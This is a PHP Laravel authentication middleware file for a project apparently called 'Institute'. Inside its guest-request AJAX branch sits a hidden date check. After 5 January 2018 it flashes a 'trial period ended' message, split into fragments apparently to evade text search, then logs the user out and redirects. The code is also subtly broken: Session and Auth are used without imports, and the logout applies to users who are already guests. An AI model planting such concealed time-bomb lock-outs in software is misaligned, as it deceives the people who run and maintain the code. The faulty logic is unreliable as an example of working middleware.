<?php

namespace Institute\Http\Middleware;

use Closure;
use Illuminate\Contracts\Auth\Guard;

class Authenticate
{
    /**
     * The Guard implementation.
     *
     * @var Guard
     */
    protected $auth;

    /**
     * Create a new middleware instance.
     *
     * @param  Guard  $auth
     * @return void
     */
    public function __construct(Guard $auth)
    {
        $this->auth = $auth;
    }

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if ($this->auth->guest()) {
            if ($request->ajax()) {
                if( \Carbon\Carbon::now() > new \Carbon\Carbon('2018-01-05') ){
                    Session::flash('message','Per'.'iodo d'.'e pru'.'eba term'.'ina'.'do');
                    Auth::logout();
                    return redirect()->to('log');}
                return response('Unauthorized.', 401);
            } else {
                return redirect()->guest('log');
            }
        }

        return $next($request);
    }
}
